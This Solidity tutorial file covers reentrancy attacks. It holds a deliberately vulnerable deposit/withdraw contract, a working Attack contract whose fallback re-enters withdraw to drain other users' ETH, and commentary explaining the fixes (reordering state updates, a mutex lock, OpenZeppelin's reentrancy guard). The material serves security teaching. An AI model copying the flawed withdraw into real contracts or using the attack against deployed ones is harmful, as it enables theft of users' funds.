// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

// Based on https://solidity-by-example.org/hacks/re-entrancy

/*
ReentrantVulnerable is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy ReentrantVulnerable
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into ReentrantVulnerable
3. Deploy Attack with address of ReentrantVulnerable
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call ReentrantVulnerable.withdraw multiple times before
ReentrantVulnerable.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- ReentrantVulnerable.deposit
- ReentrantVulnerable.withdraw
- Attack fallback (receives 1 Ether)
- ReentrantVulnerable.withdraw
- Attack.fallback (receives 1 Ether)
- ReentrantVulnerable.withdraw
- Attack fallback (receives 1 Ether)
*/

contract ReentrantVulnerable {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    ReentrantVulnerable public reentrantVulnerable;

    constructor(address _reentrantVulnerableAddress) {
        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerableAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(reentrantVulnerable).balance >= 1 ether) {
            reentrantVulnerable.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        reentrantVulnerable.deposit{value: 1 ether}();
        reentrantVulnerable.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/* 

Vulnerable Contract 

We can attack the withdraw function and drain all the money from it. This is
called "Reentrancy Attack".

We have to main attacks: Reentrancy Attack | Oracle Attacks 
Oracle attack happen if you are not using a decentralized oracle, in our contracts 
we are protected since we use Chainlink.
//rekt.com keep track of all attacks that happens in the DeFi Space.
Most of them are either reentrancy attack or oracle attack.

Two ways to be protected from this attack: 

A. Easy way
B. mutex way

We Should Update this vulneravle withdraw function:

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

---------
A. Easy Way 

So one of the things you'll always see in security tools is 
you always want to call any external contract as the last step in your function, 
or the last step in transaction.
[(bool sent, ) = msg.sender.call{value: bal}("");]

And we want to update bounces to zero before we call that external contract
[balances[msg.sender] = 0;]

The Updated:

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

    }

Now if we to try to re-enter this,
it would hit this require step and just cancel out right here
& wouldn't be able to send ETH again.

----------------------------------------------------------------

B. Next we can use Mutex Lock:
(this is what open Zeppelin does with one of the modifiers that they have)

Updated: 
    
    bool locked; 

    function withdraw() public {
        require(!locked, "revert");
        locked = true;
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
        locked = false;
    }

Using this lock in here, we only allow one piece of code to ever
execute in here at a time and we only unlock it once the code finishes.

-------------------------------

Now Openzeppelin comes with a reentrancy guard which we can use on our code. 
And it has a modifier non reentrant which 
does essentially what we were talking about with our locks

It creates a variable called status and changes it to
enter whenever a function has been entered. 

It runs out code, and then changes it back to not entered when it's finishes.

[ _status = _ENTERED ]

if we wanted to use this on our code, we can import @openzeppelin...

*/

/* In BuyItem Function.. we have set it up in a way that is safe from something called
"Reentrancy Attack" */
